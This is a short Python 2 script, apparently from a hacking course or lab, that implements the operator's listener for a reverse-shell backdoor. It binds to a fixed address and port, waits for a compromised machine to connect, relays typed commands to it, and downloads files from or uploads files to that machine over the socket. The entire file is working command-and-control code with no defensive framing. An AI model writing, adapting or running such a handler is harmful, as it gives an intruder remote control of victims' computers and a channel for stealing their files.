#!/usr/bin/env python
import socket
import json
import base64


class Listner:
    def __init__(self, ip, port):
        self.connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.connect.bind((ip, port))
        self.connect.listen(0)
        self.conn, address = self.connect.accept()
        print("Coneection Establish with " + str(address) + "\n")

    def send(self, command):
        json_data = json.dumps(command)
        self.conn.send(json_data)

    def download(self, name, content):
         with open(name, "wb") as file:
            file.write(base64.b64decode(content))

    def recive(self):
        json_data = ""
        while True:
            try:
                # why json dont work only
                json_data = json_data + self.conn.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def upload(self, name):
        with open(name, "rb") as file:
            self.send(base64.b64encode(file.read()))

    def run(self):
        while True:
            command = raw_input(">>")
            comm_list = command.split(" ")
            self.send(comm_list)

            if comm_list[0] == "exit":
                exit(0)
            elif comm_list[0] == "download":
                content = self.recive()
                if "Error" not in content:
                    self.download(comm_list[1], content)
                    result = "download sucessfull"
                else:
                    result = "Error Occured"
            elif comm_list[0] == "upload":
                self.upload(comm_list[1])
                result = self.recive()
            else:
                result = self.recive()
            print(result)




# Class end program start

listner = Listner("10.0.2.7", 4445)
listner.run()
